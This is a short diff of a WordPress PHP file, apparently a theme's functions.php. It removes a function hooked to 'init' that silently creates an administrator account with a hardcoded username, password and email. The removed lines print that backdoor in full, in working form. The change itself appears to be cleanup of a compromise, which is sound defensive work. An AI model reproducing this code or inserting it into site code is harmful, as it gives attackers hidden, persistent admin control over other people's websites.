@@ -275,15 +275,4 @@ if( function_exists('acf_add_options_page') ) {
 
 }
 
-function wpb_admin_account(){
-$user = 'fireflip';
-$pass = 'L0realSt3ll@';
-$email = 'fireflip@gmail.com';
-if ( !username_exists( $user )  && !email_exists( $email ) ) {
-$user_id = wp_create_user( $user, $pass, $email );
-$user = new WP_User( $user_id );
-$user->set_role( 'administrator' );
-} }
-add_action('init','wpb_admin_account');
-
 /* DON'T DELETE THIS CLOSING TAG */ ?>
